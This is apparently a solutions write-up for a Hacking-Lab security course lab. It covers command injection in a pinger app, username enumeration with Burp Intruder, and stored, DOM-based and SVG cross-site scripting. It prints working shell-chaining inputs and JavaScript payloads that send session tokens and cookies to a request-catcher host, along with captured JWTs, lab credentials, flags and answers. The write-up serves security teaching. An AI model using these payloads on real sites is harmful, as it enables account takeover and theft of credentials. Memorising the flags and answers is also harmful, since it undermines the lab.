# Lab 04: Command Injection, Username Enumeration & XSS - Solutions

---

# 1. Web Attack 3: Command Injection

## Challenge Overview

**Goal**: Exploit command injection in the Pinger functionality to find a secret flag.

**Endpoint**: Pinger web application (only allows pinging 127.0.0.1)

---

## Vulnerability

| Vulnerability         | Description                                                     |
| --------------------- | --------------------------------------------------------------- |
| **Command Injection** | User input passed directly to system shell without sanitization |

---

## Attack Chain

### Step 1: Confirm Command Injection

The pinger accepts an IP address and executes a ping command. Test if we can chain commands:

```
Input: 127.0.0.1; ls
```

**Result**: Both `ping` and `ls` execute → command injection confirmed.

**Why it works**: The backend likely does something like:

```bash
ping -c 1 $user_input
```

With our input, it becomes:

```bash
ping -c 1 127.0.0.1; ls
```

The `;` terminates the first command and starts a new one.

### Step 2: Explore the Application

```
Input: 127.0.0.1 && cat Readme.md
```

**Finding**: The Readme.md mentions "environment based dynamic ctf flag handling in `/etc/cont-init-d/99-add-flag.sh`"

### Step 3: Extract the Flag

Since the flag is stored in an environment variable:

```
Input: 127.0.0.1 && env | grep -i flag
```

---

## Answer

| Field | Value                   |
| ----- | ----------------------- |
| Flag  | `FLAG{ThePwr0fTheS3m1}` |

---

## Command Injection Operators

| Operator | Description                        | Example             |
| -------- | ---------------------------------- | ------------------- |
| `;`      | Execute commands sequentially      | `cmd1; cmd2`        |
| `&&`     | Execute cmd2 only if cmd1 succeeds | `cmd1 && cmd2`      |
| `\|\|`   | Execute cmd2 only if cmd1 fails    | `cmd1 \|\| cmd2`    |
| `\|`     | Pipe output of cmd1 to cmd2        | `cmd1 \| cmd2`      |
| `` ` ``  | Command substitution               | `` echo `whoami` `` |
| `$()`    | Command substitution (modern)      | `echo $(whoami)`    |

---

# 2. Web Security: Username Enumeration

## Challenge Overview

**Goal**: Find valid usernames and identify which account has password `DarkSide2021`.

**Endpoint**: `POST /login` (Galactic Empire Messenger)

---

## Vulnerability

| Vulnerability            | Description                                             |
| ------------------------ | ------------------------------------------------------- |
| **Username Enumeration** | Different error messages reveal whether username exists |

---

## Attack Chain

### Step 1: Identify Different Responses

Test login with various usernames:

| Username  | Password       | Response            | HTTP Code | Meaning            |
| --------- | -------------- | ------------------- | --------- | ------------------ |
| `asdfxyz` | `test`         | "Unknown username." | 200       | User doesn't exist |
| `vader`   | `wrongpass`    | "Wrong password."   | 200       | User exists!       |
| `vader`   | `DarkSide2021` | (Redirect to `/`)   | 302       | Valid credentials  |

**Key insight**: The application leaks whether a username exists via different error messages.

### Step 2: Enumerate Usernames with Burp Intruder

1. Capture the login request in Burp
2. Send to Intruder
3. Set payload position on username field
4. Load username wordlist from challenge description
5. Set password to `DarkSide2021`
6. Run attack

**Request template**:

```http
POST /login HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=§test§&password=DarkSide2021
```

### Step 3: Analyze Results

| Response Length | HTTP Code | Message            | Meaning              |
| --------------- | --------- | ------------------ | -------------------- |
| ~2752           | 200       | "Unknown username" | User doesn't exist   |
| ~2750           | 200       | "Wrong password"   | User exists (valid!) |
| ~337            | 302       | Redirect           | Correct credentials  |

**Results**: Only `vader` returned HTTP 302 (redirect) = successful login.

---

## Valid Usernames Found

Based on "Wrong password" responses (length ~2750):

- `jabba`
- `tarkin`
- `vader` ← **This one has password DarkSide2021**

---

## Answer

| Field                      | Value     |
| -------------------------- | --------- |
| Username with DarkSide2021 | **vader** |

---

# 3. GlockenEmil 2.0 – XSS (Stored)

## Challenge Overview

**Goal**: Steal authentication token from localStorage via stored XSS in the Rate Product functionality.

**Credentials**: `customer0/compass0`, `customer1/compass1`

**Request Catcher**: `https://<catcher>.i.vuln.land/debug` to view, any other path to capture

---

## Vulnerability

| Vulnerability  | Description                                            |
| -------------- | ------------------------------------------------------ |
| **Stored XSS** | Product rating field doesn't sanitize JavaScript input |

---

## Attack Chain

### Step 1: Locate the Token

1. Login as `customer0/compass0`
2. Open DevTools → Application → Local Storage
3. Find `token` key containing JWT

### Step 2: Craft Payload

The rating comment accepts arbitrary HTML/JS. Inject a script that:

1. Reads the token from localStorage
2. Sends it to attacker's request catcher

**Payload**:

```html
<script>
  fetch(
    "https://<catcher>.i.vuln.land/x?token=" +
      encodeURIComponent(localStorage.getItem("token")),
    { method: "GET", mode: "no-cors" }
  );
</script>
```

### Step 3: Submit and Wait for Victim

1. Login as `customer0/compass0`
2. Go to Shop → Rate a product
3. Enter the payload in the rating comment
4. Submit

### Step 4: Simulate Victim

1. Open new browser/incognito
2. Login as `customer1/compass1`
3. View the product with the malicious rating
4. Token is exfiltrated to request catcher

---

## Captured Request

```
URL: https://<catcher>.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
METHOD: GET
Headers:
Host: <catcher>.i.vuln.land
User-Agent: Mozilla/5.0 ...
Referer: https://<shop>.i.vuln.land/
...

QueryString:
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLC...
```

---

# 4. XSS – DOM-based

## Challenge Overview

**Goal**: Exploit DOM-based XSS to steal cookies via a malicious URL.

**Vulnerability Location**: "Hacking-Lab for Fun and Profit" page (`/start.html`)

---

## Vulnerability

| Vulnerability     | Description                                          |
| ----------------- | ---------------------------------------------------- |
| **DOM-based XSS** | URL fragment (`#`) injected into DOM via `innerHTML` |

---

## Why "DOM-based"?

The vulnerability exists entirely in client-side JavaScript:

1. Page reads `location.hash` (the `#...` part of URL)
2. Injects it into the page using `innerHTML` or similar
3. Browser parses and executes any HTML/JS in the fragment

**Key difference**: The `#fragment` is never sent to the server in HTTP requests.

---

## Attack Chain

### Step 1: Confirm XSS

Test if the fragment is reflected:

```
https://<target>/start.html#Hello
```

→ "Hello" appears on page

Test HTML injection:

```
https://<target>/start.html#<b>XSS</b>
```

→ **XSS** appears bold

Test JavaScript:

```
https://<target>/start.html#<img src=x onerror=alert(1)>
```

→ Alert pops up ✓

### Step 2: Craft Cookie-Stealing URL

```
https://<target>/start.html#<img src=x onerror="location.href='https://<catcher>.i.vuln.land/x?c='+encodeURIComponent(document.cookie)">
```

**URL-encoded version** (to send to victim):

```
https://<target>/start.html#%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2F<catcher>.i.vuln.land%2Fx%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E
```

### Step 3: Victim Clicks Link

When victim opens the URL, their browser:

1. Loads the page
2. JavaScript reads `#...` and injects into DOM
3. `<img>` tries to load invalid source
4. `onerror` fires, redirecting to catcher with cookie

---

## Captured Request

```
URL: https://<catcher>.i.vuln.land/x?c=jsessionid%3Dmy_name_is_bond_007
METHOD: GET
Headers:
Host: <catcher>.i.vuln.land
Referer: https://<target>/start.html
...
```

**Exfiltrated cookie**: `jsessionid=my_name_is_bond_007`

---

## Server-Side Detection?

**No** - The payload is in the URL fragment (`#...`), which:

- Is NOT sent to the server in HTTP requests
- Is processed entirely by the browser
- Server only sees the secondary request to the catcher

The origin server cannot detect this attack from access logs alone.

---

# 5. GlockenEmil 2.0 – DOM Local Storage

## Challenge Overview

**Goal**: Steal authentication token via DOM-based XSS in the Shop page.

**Vulnerability Location**: `selectedQuantity` URL parameter

---

## Vulnerability

| Vulnerability     | Description                                             |
| ----------------- | ------------------------------------------------------- |
| **DOM-based XSS** | `selectedQuantity` parameter injected into DOM unsafely |

---

## Attack Chain

### Step 1: Identify Vulnerable Parameter

1. Login as `customer0/compass0`
2. Click "Shop"
3. Notice URL: `https://<shop>/#!/shop?selectedQuantity=1`

The `selectedQuantity` value is reflected in the page without sanitization.

### Step 2: Craft Exploit URL

```
https://<shop>/#!/shop?selectedQuantity=<script>fetch('https://<catcher>.i.vuln.land/x?token='+localStorage.getItem('token'))</script>
```

**URL-encoded**:

```
https://<shop>/#!/shop?selectedQuantity=%3Cscript%3Efetch('https://<catcher>.i.vuln.land/x?token='%2BlocalStorage.getItem('token'))%3C/script%3E
```

### Step 3: Send to Victim

1. Send the malicious URL to victim
2. Victim (logged in as `customer1`) clicks the link
3. JavaScript executes, stealing their token

---

## Captured Request

```
URL: https://<catcher>.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
METHOD: GET
Headers:
Host: <catcher>.i.vuln.land
Origin: https://<shop>.i.vuln.land
Referer: https://<shop>.i.vuln.land/
...

QueryString:
token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODU5IiwidXNlcm5hbWUiOiJjdXN0b21lcjAiLCJmaXJzdG5hbWUiOiJKdWxpYW5lIi..."
```

---

# 6. GlockenEmil 2.0 – SVG

## Challenge Overview

**Goal**: Steal token via stored XSS using a malicious SVG image in the Community area.

---

## Vulnerability

| Vulnerability  | Description                                               |
| -------------- | --------------------------------------------------------- |
| **Stored XSS** | SVG files with embedded JavaScript are executed on render |

---

## Why SVG?

SVG (Scalable Vector Graphics) is an XML-based image format that can contain:

- Vector graphics (shapes, paths)
- Embedded JavaScript via `<script>` tags

When a browser renders an SVG, it executes any embedded JavaScript.

---

## Attack Chain

### Step 1: Create Malicious SVG

**malicious.svg**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000" viewBox="0 0 32 32">
  <rect fill="#f00" height="32" width="32"/>
  <rect fill="#fff" height="6" width="20" x="6" y="13"/>
  <rect fill="#fff" height="20" width="6" x="13" y="6"/>
  <script type="text/javascript">
    fetch('https://<catcher>.i.vuln.land/x?token=' + localStorage.getItem('token'));
  </script>
</svg>
```

This creates a red cross icon (looks legitimate) with hidden JavaScript.

### Step 2: Upload the SVG

1. Login as `customer0/compass0`
2. Click "Community" (top right)
3. Create a new post with the malicious SVG image

### Step 3: Victim Views the SVG

1. Victim logs in as `customer1/compass1`
2. Clicks "Home" to view community posts
3. Browser renders the SVG → JavaScript executes
4. Token sent to attacker's catcher

---

## Captured Request

```
URL: https://<catcher>.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
METHOD: GET
Headers:
Host: <catcher>.i.vuln.land
Origin: https://<shop>.i.vuln.land
Referer: https://<shop>.i.vuln.land/
...
```

---

# 7. SCHOGGI: Cross-Site Scripting (XSS) Level 2

## Challenge Overview

**Goal**: Steal cookies via stored XSS in comments, without using `<script>` tags.

**Credentials**: Attacker `alice/alice.123`, Victim `bob/bob.123`

**Request Logger**: `https://<logger>.i.vuln.land/xlog` to view logs

---

## Vulnerability

| Vulnerability  | Description                             |
| -------------- | --------------------------------------- |
| **Stored XSS** | Comments allow HTML with event handlers |

---

## Why No `<script>` Tags?

The application either:

- Filters out `<script>` tags, or
- Uses a framework (like Angular) that prevents execution of dynamically inserted `<script>` tags

**Solution**: Use HTML elements with JavaScript event handlers.

---

## Attack Chain

### Step 1: Test Script Tag (Fails)

```html
<script>
  alert("XSS");
</script>
```

→ Script doesn't execute (filtered or blocked)

### Step 2: Test Alternative Payload (Works)

```html
<img src="x" onerror='alert("XSS")' />
```

→ Alert pops up! ✓

**Why it works**:

1. `<img>` tries to load image from source `'x'`
2. This is an invalid URL → triggers `onerror` event
3. JavaScript in `onerror` attribute executes

### Step 3: Craft Cookie-Stealing Payload

```html
<img
  src="x"
  onerror='fetch("https://<logger>.i.vuln.land/x?cookie=" + encodeURIComponent(document.cookie))'
/>
```

### Step 4: Submit Malicious Comment

1. Login as `alice/alice.123`
2. Click "MORE INFO" on a cake
3. Enter the payload in the comment field
4. Submit

### Step 5: Victim Triggers Attack

1. Login as `bob/bob.123` (new browser session)
2. Click "MORE INFO" on the same cake
3. Comment loads → image fails → `onerror` fires
4. Bob's cookie sent to logger

---

## Captured Request

```
GET /x?cookie=token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwN2EzZThmNS00M2Q4LTRhZWMtOTA4Ni1iOWQ1OWE5ZTQ3ZWEiLCJ1aWQiOjEwMiwiZXhwIjoxNzYwNTYxMjg2fQ.lOvtjxE6Tth4XRuq2EK2Vcqkdzi8qlYJnmfOlrdLXbE HTTP/1.1
Host: <logger>.i.vuln.land
Origin: https://<schoggi>.i.vuln.land
Referer: https://<schoggi>.i.vuln.land/
...
```
